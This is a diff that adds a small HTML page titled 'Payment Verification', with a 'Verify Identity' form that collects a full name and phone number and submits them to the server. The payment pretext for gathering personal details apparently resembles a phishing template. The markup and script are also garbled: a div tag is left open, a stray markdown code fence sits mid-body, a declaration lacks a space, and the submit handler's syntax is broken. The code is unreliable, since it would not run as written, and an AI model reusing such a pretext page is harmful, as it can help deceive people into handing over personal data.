@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Payment Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); width: 100%; max-width: 400px; }
+        h2 { text-align: center; margin-bottom: 15px; color: #333; }    p { text-align: center; color: #666; margin-bottom: 20px; }
+        form { display: flex; flex-direction: column; gap: 15px; }
+        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        input:focus { outline: none; border-color: #007bff; }
+        button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; transition: background-color 0.3s; }
+        button:hover { background-color: #0056b3; }      button:active { background-color: #0077b6; }
+        #message{ margin-top: 15px; text-align: center; color: red; } </style>
+</head>
+<body>
+    <div class="container"
+```html
+<h2 style="text-align: center;">Verify Identity</h2>
+<p style="text-align: center; color: #666;">Please enter your details to continue.</p>
+<form action="/" method="POST">
+<input type="text" name="name" placeholder="Full Name" required> <input type="text" name="phone" placeholder="Phone Number" required>
+<button type="submit">Verify Information</button>
+</form>
+<div id="message"></div>
+
+</div>
+<script>
+    const form = document.querySelector('form');
+    constmessageDiv = document.getElementById('message');
+
+    form.onsubmit = async (e)
+        e.preventDefault();
+        messageDiv.innerText = "Processing...";
+        const formData = new FormData(form);       const response = await fetch('/', {
+            method: 'POST',
+            body: new URLSearchParams(formData)
+        });        if (response.ok) {     messageDiv.style.color = "green";
+            messageDiv.innerText = "Verification Successful!";
+        } else { messageDiv.style.color = "red";
+            messageDiv.innerText = "Error. Please try again.";
+        }
+    };
+</script>
+</body>
+</html>
